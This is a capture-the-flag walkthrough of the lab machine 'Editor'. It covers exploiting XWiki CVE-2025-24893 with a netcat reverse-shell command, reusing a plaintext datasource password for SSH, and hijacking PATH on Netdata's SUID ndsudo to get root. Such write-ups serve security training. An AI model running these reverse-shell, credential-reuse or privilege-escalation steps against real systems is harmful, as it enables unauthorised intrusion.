---
title: Editor
date: 2025-11-03
description: Easy Linux machine running XWiki 15.10.8 — exploiting CVE-2025-24893 for unauthenticated Groovy RCE, reusing datasource credentials from hibernate.cfg.xml for SSH, and abusing Netdata's SUID ndsudo helper (CVE-2024-32019) to run code as root.
tags:
  - htb
  - Easy
  - Linux
---

# Initial Recon

```bash
# Nmap 7.95 scan initiated Mon Sep  1 03:04:17 2025 as: /usr/lib/nmap/nmap -p- -sV -O -sC --min-rate=1000 -oN scan_result.txt 10.10.11.80
Warning: 10.10.11.80 giving up on port because retransmission cap hit (10).
Nmap scan report for editor.htb (10.10.11.80)
Host is up (0.47s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editor - SimplistCode Pro
8080/tcp open  http    Jetty 10.0.20
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|   Server Type: Jetty(10.0.20)
|_  WebDAV type: Unknown
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
| http-title: XWiki - Main - Intro
|_Requested resource was http://editor.htb:8080/xwiki/bin/view/Main/
|_http-server-header: Jetty(10.0.20)
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep  1 03:06:55 2025 -- 1 IP address (1 host up) scanned in 157.62 seconds
```

Both `editor.htb` and port `8080` resolved to the same application:

```text
http://10.10.11.80:8080/xwiki/bin/view/Main/
```

The instance ran **XWiki version 15.10.8** — vulnerable to **CVE-2025-24893**.

## CVE

```text
https://github.com/gunzf0x/CVE-2025-24893/
```

```python
python3 CVE-2025-24893.py -t http://editor.htb:8080' -c 'busybox nc 10.10.14.5 3333 -e /bin/bash'
```

Received a shell as `xwiki`.

# User

## Credential Reuse

User enumeration from the compromised service:

```text
root:x:0:0:root:/root:/bin/bash
oliver:x:1000:1000:,..:/home/oliver:/bin/bash
```

Reviewing XWiki's configuration documentation led to `hibernate.cfg.xml` — which held a batch of datasource passwords. One of them belonged to `oliver`:

```text
oliver : theEd1t0rTeam99
```

Gained `User` flag.

# Root

## ndsudo PATH Hijack

SUID binaries owned by root:

```bash
find / -user root -perm -4000 -print 2>/dev/null
```

**ndsudo** from the Netdata installation stood out — vulnerable to **CVE-2024-32019**, a PATH injection in its allowed-plugin lookup:

- https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93
- https://github.com/AzureADTrent/CVE-2024-32019-POC
- https://github.com/sPhyos/cve-2024-32019-PoC

> **Note**: Compile the `nvme.c` file on an x86-64 system if you're on ARM — the target runs x86-64.

```text
Personally compiled on windows system for this box
```

Compile locally:

```bash
gcc nvme.c -o nvme
```

Transfer it over:

```bash
scp nvme oliver@editor.htb:/tmp/
```

Prepend `/tmp` to `PATH` and invoke `ndsudo` — it resolves `nvme` from our controlled path and executes it with effective UID 0:

```bash
chmod +x /tmp/nvme
export PATH=/tmp:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

Gained `Root` shell
